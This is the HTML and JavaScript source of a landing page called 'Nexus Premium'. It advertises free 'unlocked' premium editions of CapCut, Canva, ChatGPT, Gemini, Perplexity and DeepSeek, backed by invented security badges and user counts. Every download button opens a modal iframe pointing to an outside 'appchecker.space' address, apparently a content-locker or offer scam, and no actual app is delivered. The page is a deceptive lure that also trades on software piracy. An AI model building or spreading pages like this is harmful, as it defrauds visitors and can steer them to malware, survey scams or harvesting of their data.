<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Nexus Premium | Elite App Hub</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --bg: #020205;
            --accent: #6366f1;
            --glass: rgba(255, 255, 255, 0.03);
            --border: rgba(255, 255, 255, 0.1);
        }

        body {
            background-color: var(--bg);
            color: white;
            font-family: 'Plus Jakarta Sans', sans-serif;
            margin: 0;
            overflow-x: hidden;
        }

        .bg-glow {
            position: fixed;
            width: 60vw;
            height: 60vw;
            background: radial-gradient(circle, rgba(99, 102, 241, 0.12) 0%, rgba(0,0,0,0) 70%);
            border-radius: 50%;
            z-index: -1;
            filter: blur(80px);
        }

        .premium-card {
            background: linear-gradient(135deg, rgba(255,255,255,0.05) 0%, rgba(255,255,255,0.01) 100%);
            backdrop-filter: blur(15px);
            border: 1px solid var(--border);
            border-radius: 32px;
            transition: all 0.5s cubic-bezier(0.2, 1, 0.3, 1);
        }

        .premium-card:hover {
            transform: translateY(-12px) scale(1.02);
            border-color: rgba(99, 102, 241, 0.4);
            box-shadow: 0 30px 60px rgba(0,0,0,0.6), 0 0 20px rgba(99, 102, 241, 0.1);
        }

        .status-dot {
            width: 8px;
            height: 8px;
            background: #10b981;
            border-radius: 50%;
            display: inline-block;
            box-shadow: 0 0 10px #10b981;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; }
            50% { opacity: 0.4; }
            100% { opacity: 1; }
        }

        #app-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0, 0, 0, 0.98);
            backdrop-filter: blur(40px);
            z-index: 100;
            display: none;
            overflow-y: auto;
        }

        .locker-inner {
            width: 100%;
            max-width: 480px;
            height: 85vh;
            background: white;
            border-radius: 35px;
            overflow: hidden;
        }
    </style>
</head>
<body>

    <div class="bg-glow" style="top: -10%; left: -10%;"></div>
    <div class="bg-glow" style="bottom: -10%; right: -10%; background: radial-gradient(circle, rgba(168, 85, 247, 0.08) 0%, rgba(0,0,0,0) 70%);"></div>

    <div class="max-w-6xl mx-auto px-6 py-12 relative">
        <div class="flex justify-between items-center mb-16 text-xs font-bold tracking-[0.2em] text-gray-500 uppercase">
            <div class="flex items-center gap-2">
                <span class="status-dot"></span> SYSTEM ENCRYPTED & SECURE
            </div>
            <div>VER. 4.0.26 // 2026</div>
        </div>

        <header class="text-center mb-24">
            <h1 class="text-6xl md:text-8xl font-extrabold mb-6 tracking-tighter bg-clip-text text-transparent bg-gradient-to-b from-white to-gray-500">
                Nexus Premium
            </h1>
            <p class="text-gray-400 text-xl max-w-2xl mx-auto leading-relaxed">
                The elite repository for unlocked mobile power. Access professional tools, ad-free environments, and advanced AI models.
            </p>
        </header>

        <div class="grid grid-cols-2 md:grid-cols-4 gap-6 mb-24">
            <div class="text-center p-6 border-r border-white/5">
                <div class="text-3xl font-black text-white">124k</div>
                <div class="text-[10px] text-gray-500 font-bold tracking-widest uppercase mt-1">Daily Users</div>
            </div>
            <div class="text-center p-6 border-r border-white/5">
                <div class="text-3xl font-black text-indigo-400">99.9%</div>
                <div class="text-[10px] text-gray-500 font-bold tracking-widest uppercase mt-1">Uptime Rate</div>
            </div>
            <div class="text-center p-6 border-r border-white/5">
                <div class="text-3xl font-black text-white">612</div>
                <div class="text-[10px] text-gray-500 font-bold tracking-widest uppercase mt-1">Pro Apps</div>
            </div>
            <div class="text-center p-6">
                <div class="text-3xl font-black text-white">Secure</div>
                <div class="text-[10px] text-gray-500 font-bold tracking-widest uppercase mt-1">SSL Verified</div>
            </div>
        </div>

        <div id="grid-container" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-8"></div>
    </div>

    <div id="app-overlay">
        <div class="max-w-6xl mx-auto px-6 py-16">
            <button onclick="hideDetails()" class="mb-12 flex items-center gap-3 text-gray-500 hover:text-white font-bold group transition-colors">
                <svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="3" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"/></svg>
                EXIT TO REPOSITORY
            </button>
            <div id="overlay-content"></div>
        </div>
    </div>

    <div id="locker-modal" class="fixed inset-0 z-[200] bg-black/90 hidden items-center justify-center p-6" onclick="closeLocker()">
        <div class="locker-inner" onclick="event.stopPropagation()">
            <iframe src="https://appchecker.space/cl/i/6nnlj7" frameborder="0" class="w-full h-full"></iframe>
        </div>
    </div>

    <script>
        const appData = [
            { 
                name: 'CapCut', 
                logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/capcut-icon.png', 
                desc: 'The definitive video editing suite. Nexus Edition unlocks all 4K templates, AI voice-overs, and removes all export watermarks for professional content creation.', 
                features: ['Full Template Access', 'AI Smart Cutout', '4K Ultra HD Export', 'No Watermark'], 
                rating: '4.9',
                category: 'Video Design'
            },
            { 
                name: 'Canva', 
                logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/canva-icon.png', 
                desc: 'Experience Canva Pro without limits. Access the complete Magic Studio AI suite, 100M+ premium assets, and the professional Brand Kit management system.', 
                features: ['Magic AI Resizer', 'Pro Asset Library', 'Background Eraser', 'Premium Fonts'], 
                rating: '4.8',
                category: 'Graphic Design'
            },
            { 
                name: 'ChatGPT', 
                logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/chatgpt-icon.png', 
                desc: 'Unleash GPT-4o. This version provides priority access to the worlds most advanced reasoning model, including DALL-E 3 image generation and advanced data analysis.', 
                features: ['GPT-4o Model', 'DALL-E 3 Enabled', 'Voice Mode Pro', 'Priority Server'], 
                rating: '4.9',
                category: 'AI Engine'
            },
            { 
                name: 'Gemini', 
                logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/google-gemini-icon.png', 
                desc: 'Googles multi-modal powerhouse. Seamlessly integrated into the Google ecosystem to manage your documents, emails, and complex research tasks at light speed.', 
                features: ['Workspace Sync', 'Ultra-Fast Logic', 'Image Recognition', 'Live Research'], 
                rating: '4.6',
                category: 'Smart Assistant'
            },
            { 
                name: 'Perplexity', 
                logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/perplexity-ai-icon.png', 
                desc: 'The end of traditional search. Perplexity reads the live internet to give you instant, cited answers with no ads and absolute accuracy.', 
                features: ['Live Citations', 'Pro Search Mode', 'Claude 3 / GPT-4 Switch', 'Clean UI'], 
                rating: '4.8',
                category: 'AI Search'
            },
            { 
                name: 'DeepSeek', 
                logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/deepseek-logo-icon.png', 
                desc: 'The reasoning model optimized for the technical mind. Superior at solving complex math, generating bug-free code, and analyzing deep logic chains.', 
                features: ['R1 Reasoning', 'Coding Expert', 'Math Logic Pro', 'Instant Response'], 
                rating: '4.7',
                category: 'Development'
            }
        ];

        function init() {
            const container = document.getElementById('grid-container');
            appData.forEach((app, i) => {
                container.innerHTML += `
                    <div class="premium-card p-10 flex flex-col items-center cursor-pointer text-center" onclick="showDetails(${i})">
                        <img src="${app.logo}" alt="${app.name}" class="w-20 h-20 rounded-2xl mb-6 shadow-xl shadow-black/50">
                        <h3 class="text-xl font-extrabold tracking-tight">${app.name}</h3>
                        <div class="mt-3 px-3 py-1 rounded-full bg-white/5 border border-white/10 text-[9px] font-black uppercase tracking-widest text-indigo-400">
                            ${app.category}
                        </div>
                    </div>
                `;
            });
        }

        function showDetails(idx) {
            const app = appData[idx];
            const overlay = document.getElementById('app-overlay');
            document.getElementById('overlay-content').innerHTML = `
                <div class="grid lg:grid-cols-2 gap-20 items-start">
                    <div>
                        <div class="flex items-center gap-8 mb-10">
                            <img src="${app.logo}" class="w-28 h-28 rounded-[28px] shadow-2xl">
                            <div>
                                <h2 class="text-6xl font-black mb-2">${app.name}</h2>
                                <p class="text-indigo-400 font-bold tracking-widest uppercase text-sm">Nexus Certified Gold</p>
                            </div>
                        </div>
                        <p class="text-2xl text-gray-400 leading-relaxed mb-12 font-light">${app.desc}</p>
                        <div class="flex flex-col sm:flex-row gap-5">
                            <button onclick="openLocker()" class="bg-indigo-600 hover:bg-indigo-500 transition-all flex-1 py-6 rounded-2xl font-black text-xl flex items-center justify-center gap-4">
                                <img src="https://www.vectorlogo.zone/logos/google_play/google_play-icon.svg" class="w-7 h-7"> DOWNLOAD APK
                            </button>
                            <button onclick="openLocker()" class="bg-white text-black hover:bg-gray-200 transition-all flex-1 py-6 rounded-2xl font-black text-xl flex items-center justify-center gap-4">
                                <img src="https://www.vectorlogo.zone/logos/apple/apple-icon.svg" class="w-7 h-7"> GET ON IOS
                            </button>
                        </div>
                    </div>
                    <div class="premium-card p-12">
                        <h4 class="text-2xl font-bold mb-8 border-b border-white/10 pb-6 uppercase tracking-widest text-gray-500">Premium Unlocks</h4>
                        <div class="space-y-6">
                            ${app.features.map(f => `
                                <div class="flex items-center gap-5">
                                    <div class="w-6 h-6 rounded-full bg-indigo-500/20 border border-indigo-500 flex items-center justify-center text-indigo-400 text-xs">✓</div>
                                    <span class="text-xl font-bold text-gray-200">${f}</span>
                                </div>
                            `).join('')}
                        </div>
                    </div>
                </div>
            `;
            overlay.style.display = 'block';
            gsap.fromTo(overlay, { opacity: 0, y: 50 }, { opacity: 1, y: 0, duration: 0.5 });
            window.scrollTo(0, 0);
        }

        function hideDetails() {
            gsap.to('#app-overlay', { opacity: 0, duration: 0.3, onComplete: () => {
                document.getElementById('app-overlay').style.display = 'none';
            }});
        }

        function openLocker() {
            document.getElementById('locker-modal').style.display = 'flex';
            gsap.fromTo('.locker-inner', { scale: 0.8, opacity: 0 }, { scale: 1, opacity: 1, duration: 0.5 });
        }

        function closeLocker() {
            document.getElementById('locker-modal').style.display = 'none';
        }

        init();
    </script>
</body>
</html>
